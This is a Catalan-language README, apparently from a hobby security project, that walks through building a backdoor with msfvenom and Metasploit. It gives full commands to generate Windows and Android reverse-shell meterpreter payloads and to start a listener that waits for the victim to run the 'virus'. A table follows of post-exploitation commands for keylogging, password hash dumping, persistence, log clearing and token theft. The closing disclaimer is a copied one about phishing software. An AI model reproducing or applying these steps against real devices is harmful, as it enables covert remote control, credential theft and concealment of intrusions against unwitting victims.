# Metaexploit_msfvenom


En aquest projecte us explicaré com utilitzar msfvenom i meetaexploit per crear una backdoor a qualsevol dispositiu a través de un arxiu maliciós.


## MSFVENOM
Msfvenom és una eina potent de generació d'exploits del framework Metasploit, utilitzada per crear càrregues útils de malware personalitzades. Permet generar diferents tipus d'arxius maliciosos, com arxius executables, documents ofuscats o scripts, amb l'objectiu d'explotar vulnerabilitats en sistemes informàtics per a fins de prova o atacs.


### Com configurar un arxiu maliciós:


1. Primer de tot hem de tenir el framework de metaexploit instal·lat
2. Ara crearem el payload utilitzant la següent estructura:
```
msfvenom [payload] (LHOST) (LPORT)[Output name and format]
```
Un exemple seria el següent:
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.172.128 LPORT=4444 -o ejemplo.apk
```
Important: El tipus de payload que utilitzem determinarà en què del dispositiu afectarà el nostre binari. Podeu veure tots els payloads fent la comanda
```
msfvenom -l
```
3. Per configurar el payload bé hem de configurar els següents paràmetres de la següent manera:
    - LHOST: Ip de la màquina atacant Pública o privada (si és privada la víctima ha d'estar a la mateixa xarxa que nosaltres)
    - LPORT: Port que utilitzarem con connectar-nos a la màquina. Recomando utilitzar un port que Windows no utilitzi per res més (en aquest cas el 4444)
    - Payload: Per crear una sessió remota (backdoor) utilitzarem meterpreter
    - Arquitectura: En cas de vulguem infectar un ordinador has d'indicar si vols un payload de 32 bits o 64 bits
    - Output: Nom i format en els que exportaràs el "virus"
    - Format: Format en què exportaràs el payload


4. Per fer un payload de Windows l'estructura és la següent:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ip maquina atacant) LPORT=4444 -a x86 -p windows -f exe > ejemplo.exe
```
5. Per fer un payload d'Android l'estructura és la següent:
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=(ip maquina atacant) LPORT=4444 -o ejemplo.apk
```

![Payload de windows](./media/1.png)

![Payload d'android](./media/2.png)




## Metaexploit
Metasploit és una plataforma de proves d'intrusió i desenvolupament d'exploits, que ofereix una gamma d'eines i mòduls per a l'exploració, l'avaluació de vulnerabilitats i l'execució d'atacs en sistemes informàtics. És utilitzada per professionals de seguretat informàtica per detectar i corregir debilitats en els sistemes o per a fins maliciosos per part de cibercriminals.


### Com funciona:


Un cop tenim el payload creat hem de configurar metaexploit per posar la nostra màquina en "Escolta" i així poder-nos connectar.


1. Entrem a metaexploit
```
msfconsole
```
2. Configurem quin payload / expoit volem que utilitzi


```
use exploit/multi/handler
```
Ara el payload:
Important: Utilitzar a metaexploit el mateix payload que hem configurat al venom
```
set payload windows/meterpreter/reverse_tcp
```
3. Ara hem de configurat LHOST i LPORT
```
set LHOST "IPmaquinaatacant"
```
```
set LPORT 4444
```


4. Executem la comanda “options” per veure si tot està configurat i iniciem metaexploit.
```
options
```
Per iniciar:
```
run
```


Ara ja només ens queda executar el malware a la màquina víctima i com que tindrem la màquina atacant en escolta es connectarà automàticament.


![Metaexploit](./media/3.png)



## Meterpreter


Meterpreter és un payload altament flexible i potent del framework Metasploit que s'utilitza per a l'explotació remota de sistemes. Proporciona un accés complet i control sobre la màquina compromesa, permetent executar comandes, obtenir informació i realitzar diverses accions malicioses. És àmpliament utilitzat per professionals de la seguretat informàtica per a propòsits d'auditoria i proves d'intrusió.


### Com funciona:

![Meterpreter](./media/4.png)



Un cop tenim accés a través de meterpreter algunes comandes interessants són les seguents:


| Comanda         | Descripció                                                  |
| --------------- | ----------------------------------------------------------- |
| `sysinfo`       | Obté informació detallada del sistema compromès.            |
| `shell`         | Crea una shell interactiva en el sistema compromès.         |
| `ps`            | Llista els processos en execució al sistema compromès.      |
| `getuid`        | Mostra el nom d'usuari actual al sistema compromès.         |
| `upload`        | Carrega un fitxer local al sistema compromès.               |
| `download`      | Descarrega un fitxer del sistema compromès al teu local.    |
| `keyscan_start` | Inicia l'enregistrament de pulsacions de teclat.            |
| `keyscan_dump`  | Recupera les pulsacions de teclat enregistrades.            |
| `migrate`       | Canvia al procés especificat, escapant de l'execució actual.|
| `execute`       | Executa una comanda en el sistema compromès.                |
| `screenshot`        | Captura una imatge de la pantalla del sistema compromès.              |
| `webcam_snap`       | Captura una imatge utilitzant la càmera web del sistema compromès.     |
| `keyscan_stop`      | Atura l'enregistrament de pulsacions de teclat.                        |
| `download_all`      | Descarrega tots els fitxers del sistema compromès a la teva màquina.   |
| `portfwd`           | Reenvia els ports locals o remots per a l'accés a serveis remots.      |
| `pivot_tcp`         | Estableix una connexió TCP a través d'un salt (pivot) des de la víctima. |
| `run persistence`   | Estableix persistència en el sistema compromès per a reinicis posteriors. |
| `clearev`           | Elimina les entrades d'events de seguretat per a ocultar l'activitat. |
| `getsystem`         | Intenta obtenir privilegis de sistema més alts en el sistema compromès. |
| `portscan`          | Escaneja els ports oberts en el sistema compromès.                     |
| `hashdump`             | Recupera les contrasenyes emmagatzemades en el sistema compromès.           |
| `getpid`               | Obté l'identificador del procés actual en el sistema compromès.             |
| `enumdesktops`         | Enumera els escriptoris actius en el sistema compromès.                     |
| `getprivs`             | Mostra els privilegis actuals del procés en el sistema compromès.          |
| `enum_users`           | Enumera els usuaris i grups en el sistema compromès.                        |
| `enum_shares`          | Enumera les carpetes compartides en el sistema compromès.                   |
| `execute_script`       | Executa un script de llenguatge específic en el sistema compromès.          |
| `local_exploit_suggest`| Suggereix exploits locals adequats basats en les vulnerabilitats detectades.|
| `timestomp`            | Modifica els timestamps de fitxers per a ocultar l'activitat maliciosa.     |
| `steal_token`          | Roba el token d'identitat d'un procés en execució per a elevació de privilegis. |


## DISCLAIMER

El software de phishing és una eina que simula pàgines web legítimes per obtenir informació personal dels usuaris. Malgrat això, els creadors afirmen que la seva intenció no és perjudicar els usuaris, sinó per demostrar la vulnerabilitat de les pàgines web i promoure la seguretat informàtica.
El projecte ha estat desenvolupat amb l'objectiu de proporcionar als estudiants i als professionals de la seguretat informàtica una eina per comprendre les vulnerabilitats dels sistemes informàtics i les tècniques que poden utilitzar els hackers per accedir a informació confidencial.
No ens fem responsables del posibles usos inadequats que se li puguin donar a aquesta eina.

![Rickroll](./media/roll.gif)















